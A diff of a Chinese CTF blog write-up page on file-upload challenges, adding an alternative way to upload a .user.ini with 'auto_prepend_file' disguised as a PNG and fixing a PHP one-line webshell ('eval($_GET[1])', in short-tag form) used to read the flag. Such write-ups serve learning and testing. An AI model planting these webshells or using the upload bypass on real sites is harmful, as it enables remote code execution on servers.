@@ -26,7 +26,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708185933304.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709192409443.png">
 <meta property="article:published_time" content="2024-07-08T03:38:23.902Z">
-<meta property="article:modified_time" content="2024-07-09T12:54:47.225Z">
+<meta property="article:modified_time" content="2024-07-10T01:42:06.464Z">
 <meta property="article:author" content="Wwan">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708110833100.png">
@@ -208,6 +208,10 @@
 <p>先上传一个随意图片，如之前操作一样抓包，把上传文件改为.user.ini，并加上</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = 1.png</span><br></pre></td></tr></table></figure>
 
+<p><strong>&#x2F;&#x2F;或者新建一个txt，输入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = 1.png</span><br></pre></td></tr></table></figure>
+
+<p><strong>将其改为png形式，直接上传,再修改一下上传文件也是一样的</strong></p>
 <p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709192409443.png" alt="image-20240709192409443"></p>
 <p>随便新建一个1.txt，写入一句话木马，例如之前的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_GET[1]);?&gt;</span><br></pre></td></tr></table></figure>
@@ -225,7 +229,7 @@
 <p>上传成功了耶，然后就直接查flag吧.</p>
 <p>(所以与153的区别就是文件马的内容可以稍微改一下，绕过它的处理机制)</p>
 <h4 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h4><p>同上，四种php风格试一下发现文件马里面要改成使用短标签绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">	eval($GET[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">	eval($_GET[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 
 
